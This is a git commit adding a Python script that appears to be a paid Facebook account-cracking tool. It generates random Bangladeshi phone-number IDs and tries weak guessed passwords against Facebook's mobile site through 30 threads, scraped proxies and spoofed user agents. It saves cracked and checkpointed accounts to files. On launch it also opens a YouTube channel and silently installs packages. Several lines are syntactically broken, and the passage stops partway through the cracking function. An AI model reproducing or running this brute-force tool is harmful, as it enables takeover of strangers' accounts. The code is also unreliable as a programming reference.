ba698ca052af5f709463ab690241870fb8067f5c
Nasimblog <118344767+Nasimblog@users.noreply.github.com>
2023-04-03 11:43:46 +0600

    Add files via upload

---
+++ nasim-ar.py
@@ -0,0 +1,166 @@
+#___________Impoet Module____________
+import os
+os.system("xdg-open https://youtube.com/@namedesign7592")
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
+#________________Step 2______________
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+#_______________Coler Code_____________
+RED = '\33[1;91m'
+WHITE = '\33[1;97m'
+GREEN = '\33[1;32m' 
+YELLOW = '\33[1;33m'
+BLUE = '\33[1;34m'
+ORANGE = '\33[1;35m'
+P = '\1b[1;97m' 
+M = '\1b[1;91m' 
+H = '\1b[1;92m' 
+K = '\1b[1;93m' 
+B = '\1b[1;94m' 
+U = '\1b[1;95m' 
+O = '\1b[1;96m' 
+N = '\1b[0m'    
+A = '\1b[1;90m' 
+BN = '\1b[1;107m' 
+BBL = '\1b[1;106m' 
+BP = '\1b[1;105m' 
+BB = '\1b[1;104m' 
+BK = '\1b[1;103m' 
+BH = '\1b[1;102m' 
+BM = '\1b[1;101m' 
+BA = '\1b[1;100m' 
+#____________Timedate_____________
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+#_____________Proxy______________
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+    
+def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        
+logo = ("""\33[1;37m
+ ███    ██  █████  ███████ ██ ███    ███ 
+████   ██ ██   ██ ██      ██ ████  ████ 
+██ ██  ██ ███████ ███████ ██ ██ ████ ██ 
+██  ██ ██ ██   ██      ██ ██ ██  ██  ██ 
+██   ████ ██   ██ ███████ ██ ██      ██ 
+                                        
+                                        
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                     
+             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+             \033[1;93m▇▇➣    \033[1;95m𝐀𝐔𝐓𝐇𝐎𝐑   : 𝐍𝐀𝐒𝐈𝐌KHAN                    \033[1;93m▇▇
+             \033[1;93m▇▇➣    \033[1;94m𝐆𝐈𝐓𝐇𝐔𝐁   : ༺𝐍𝐀𝐒𝐈𝐌༻                    \033[1;93m▇▇
+             \033[1;93m▇▇➣    \033[1;93m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 :𝐌D 𝐍𝐀𝐒𝐈𝐌 𝐌𝐈𝐀              \033[1;93m▇▇
+             \033[1;93m▇▇➣    \033[1;92m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 : 𝟎𝟏𝟕𝟔𝟖𝟓𝟕𝟔𝟗𝟏𝟖༻               \033[1;93m▇▇
+             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID                               \033[1;93m▇▇
+             \033[1;93m▇▇➣    \033[1;94mGIVE ME 100RS FOR APRVAL               \033[1;93m▇▇
+             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+         \033[1;92m༄𝐍𝐀𝐒𝐈𝐌᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+""")
+ 
+def naima():
+	print('-------------------')
+#_____________Def Kaif______________ 
+def Main():
+        os.system("clear")
+        print(logo)
+        print(" [1] RANDOM CRACK")
+        print(" [0] Exit")
+        Sumaiya =input("\ [?] Choose : ")
+        if Sumaiya in ["1","01"]:
+            fuck()
+        if Sumaiya in [" 0", "00"]:
+            exit()
+        else:
+            exit()
+#______________Def Sc__________            
+def fuck():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print('[×] Exm: 019, 016, 017, 018, 014, 014')
+    code = input('[?] Choice Your Code : ')
+    name = ''.join(random.choice(string.digits) for _ in range(2))
+    cod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    print(logo)
+    print('[×] Exm: 2000 3000 5000 10000 ')
+    limit = int(input('[?] Choice Your Liimit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as asha:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print('[×] Total ids: '+tl)
+        print("[×] Your Code: "+code)
+        print('[×] Airplne Moode On/Off')
+        print('[×] Process has been started')
+        print('-------------------')
+        for love in user:
+            uid = code+name+cod+love
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
+            asha.submit(𝐍𝐀𝐒𝐈𝐌,uid,pwx,tl)
+    print('-------------------')
+    print(' [✓] Crack process has been completed')
+    print(' [✓] OK Ids saved as 𝐍𝐀𝐒𝐈𝐌-OK.txt')
+    print(' [✓] CP Id Save as 𝐍𝐀𝐒𝐈𝐌-CP.txt')
+    print('-------------------')
+def 𝐍𝐀𝐒𝐈𝐌(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\[𝐍𝐀𝐒𝐈𝐌]--[%s/%s]--[OK-%s]~[CP-%s] \'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
